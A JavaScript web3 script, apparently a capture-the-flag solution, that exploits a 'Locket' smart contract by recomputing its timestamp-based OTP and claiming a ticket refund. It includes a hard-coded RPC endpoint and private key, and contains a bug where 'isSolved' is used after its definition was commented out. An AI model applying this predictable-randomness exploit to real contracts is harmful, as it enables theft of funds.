const { Web3 } = require("web3")

// Replace with the provided RPC Endpoint
const web3 = new Web3(
  "http://103.145.226.92:48334/6edc0037-9b89-4d7b-8357-89ea9e515e24"
)

// ABI for Setup and Locket contracts (replace with actual ABI for these contracts)
const setupAbi = [
  { inputs: [], stateMutability: "payable", type: "constructor" },
  {
    inputs: [],
    name: "isSolved",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "locket",
    outputs: [{ internalType: "contract Locket", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
]
const locketAbi = [
  { inputs: [], stateMutability: "payable", type: "constructor" },
  {
    inputs: [],
    name: "buyNormalTicket",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "buyPartyTicket",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "isBought",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "isSolved",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ internalType: "uint256", name: "otp", type: "uint256" }],
    name: "refundNormalTicket",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
]
// Provided contract addresses and private key
const setupAddress = "0xd7566ECFCe0E22906D8DdDeE389D1A5FFFB667c3"
const privateKey =
  "0x309ccc44c16d658d43f3fc34a79de3411dd3d148776ebf1e648e0caf7831b25d"
const walletAddress = "0x7413f243BfB34A621a18Cd9FaFD484eA1c1F0Bf1" // Your wallet address

// Add your private key to the wallet
const account = web3.eth.accounts.privateKeyToAccount(privateKey)
web3.eth.accounts.wallet.add(account)
web3.eth.defaultAccount = account.address

const buyNormalTicket = async (locketContract) => {
  const tx = locketContract.methods.buyNormalTicket()

  const gasEstimate = await tx.estimateGas({
    from: walletAddress,
    value: web3.utils.toWei("5", "ether"),
  })

  const receipt = await tx.send({
    from: walletAddress,
    value: web3.utils.toWei("5", "ether"),
    gas: gasEstimate,
  })

  console.log("Normal ticket purchased:", receipt)
}

const refundNormalTicket = async (locketContract, otp) => {
  const tx = locketContract.methods.refundNormalTicket(otp)

  const gasEstimate = await tx.estimateGas({
    from: walletAddress,
  })

  const receipt = await tx.send({
    from: walletAddress,
    gas: gasEstimate,
  })

  console.log("Normal ticket refunded:", receipt)
}

const buyPartyTicket = async (locketContract) => {
  const tx = locketContract.methods.buyPartyTicket()

  const gasEstimate = await tx.estimateGas({
    from: walletAddress,
    value: web3.utils.toWei("30", "ether"),
  })

  const receipt = await tx.send({
    from: walletAddress,
    value: web3.utils.toWei("30", "ether"),
    gas: gasEstimate,
  })

  console.log("Party ticket purchased:", receipt)
}

const calculateOTP = async (timestamp) => {
  // Recreate the OTP logic using soliditySha3 (equivalent to keccak256)
  const otp = web3.utils.soliditySha3(
    { t: "uint256", v: timestamp },
    { t: "address", v: walletAddress }
  )

  // Convert the resulting hash to an integer and mod by 1000000
  const otpInt = parseInt(otp, 16) % 1000000

  return otpInt
}

async function solveChallenge() {
  try {
    // Setup contract instance
    const setupContract = new web3.eth.Contract(setupAbi, setupAddress)

    // Get the Locket contract address from the Setup contract
    const locketAddress = await setupContract.methods.locket().call()
    console.log(`Locket Contract Address: ${locketAddress}`)

    // Locket contract instance
    const locketContract = new web3.eth.Contract(locketAbi, locketAddress)

    // Buy a normal ticket first
    // await buyNormalTicket(locketContract)

    const latestBlock = await web3.eth.getBlock("latest")
    const blockTimestamp = latestBlock.timestamp

    // Generate OTP based on contract's logic
    const otp = await calculateOTP(blockTimestamp)
    console.log(`Generated OTP: ${otp}`)

    // Refund the normal ticket
    await refundNormalTicket(locketContract, otp)

    // Buy the party ticket (assuming you have accumulated enough ether)
    // await buyPartyTicket(locketContract)

    // Check if the challenge is solved
    // const isSolved = await locketContract.methods.isSolved().call()
    console.log(`Challenge Solved: ${isSolved}`)
  } catch (error) {
    console.error("Error solving the challenge:", error)
  }
}

// Execute the function to solve the challenge
solveChallenge()
